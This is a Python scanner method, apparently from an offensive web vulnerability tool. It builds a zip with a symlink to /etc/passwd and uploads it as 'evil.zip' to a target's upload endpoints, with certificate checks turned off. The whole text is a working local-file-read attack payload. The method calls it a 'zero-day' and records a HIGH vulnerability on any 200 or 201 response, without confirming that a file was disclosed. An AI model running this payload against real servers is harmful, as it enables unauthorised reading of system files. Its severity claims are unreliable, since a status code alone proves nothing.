    def test_zeroday_lfi_via_symlink(self):
        """Zero-day #85 — LFI via Symbolic Link Upload."""
        if not self.deep: return
        self._print("[*]", "Zero-day: LFI via Symlink...", "INFO")
        # Create a zip with a symlink to /etc/passwd
        import zipfile, io
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
            # Add a "symlink" entry (Unix file mode 0xA000)
            info = zipfile.ZipInfo('link.txt')
            info.external_attr = 0xA000 << 16  # symlink mode
            info.create_system = 3  # Unix
            zf.writestr(info, '/etc/passwd')
        zip_data = zip_buffer.getvalue()
        upload_paths = ["/upload", "/api/upload"]
        for path in upload_paths:
            url = urljoin(self.target, path)
            try:
                files = {"file": ("evil.zip", zip_data, "application/zip")}
                r = requests.post(url, files=files, timeout=5, verify=False)
                if r and r.status_code in (200, 201):
                    self._add_vuln(f"Zero-day Symlink LFI Upload",
                                    "HIGH", url,
                                    "Uploaded zip with symlink to /etc/passwd")
            except Exception: pass

